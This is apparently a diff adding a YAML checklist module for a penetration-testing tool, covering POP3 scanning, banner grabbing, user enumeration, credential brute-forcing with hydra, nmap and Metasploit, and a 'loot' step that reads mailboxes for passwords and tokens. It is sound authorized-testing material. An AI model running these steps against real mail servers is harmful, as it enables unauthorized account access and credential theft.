@@ -1,0 +1,74 @@
+module: pop3
+name: POP3 (110 / 995)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version + capabilities
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script=pop3-capabilities $IP
+      - id: banner
+        text: Banner grab (plain)
+        commands: |
+          nc -nv $IP $PORT
+      - id: banner_tls
+        text: Banner grab over TLS (995)
+        tls_only: true
+        commands: |
+          openssl s_client -connect $IP:$PORT -crlf
+
+  - id: enum
+    name: Enumeration
+    steps:
+      - id: ntlm_info
+        text: Leak host/domain via NTLM (if AUTH NTLM offered)
+        commands: |
+          nmap -p$PORT --script=pop3-ntlm-info $IP
+      - id: user_enum
+        text: Username enumeration via USER response differences
+        manual: true
+        commands: |
+          # USER <name>  -> +OK vs -ERR difference reveals valid users
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: brute
+        text: Credential brute-force
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST pop3://$IP -s $PORT
+          hydra -L $USERLIST -P $PASSLIST pop3s://$IP -s $PORT
+          nmap -p$PORT --script=pop3-brute $IP
+      - id: brute_msf
+        text: Brute-force via Metasploit
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/pop3/pop3_login; set RHOSTS $IP; set RPORT $PORT; set USER_FILE $USERLIST; set PASS_FILE $PASSLIST; run; exit"
+
+  - id: access
+    name: Mailbox Access & Loot
+    steps:
+      - id: login
+        text: Authenticate and list mail (plain)
+        commands: |
+          nc -nv $IP $PORT
+          # USER <user>
+          # PASS <pass>
+          # LIST
+          # RETR 1
+      - id: login_tls
+        text: Authenticate over TLS (995)
+        tls_only: true
+        commands: |
+          openssl s_client -connect $IP:$PORT -crlf
+          # USER <user> / PASS <pass> / LIST / RETR 1
+      - id: loot
+        text: Read messages for creds / password resets / internal info
+        manual: true
+        commands: |
+          # RETR each message; grep for passwords, tokens, VPN configs
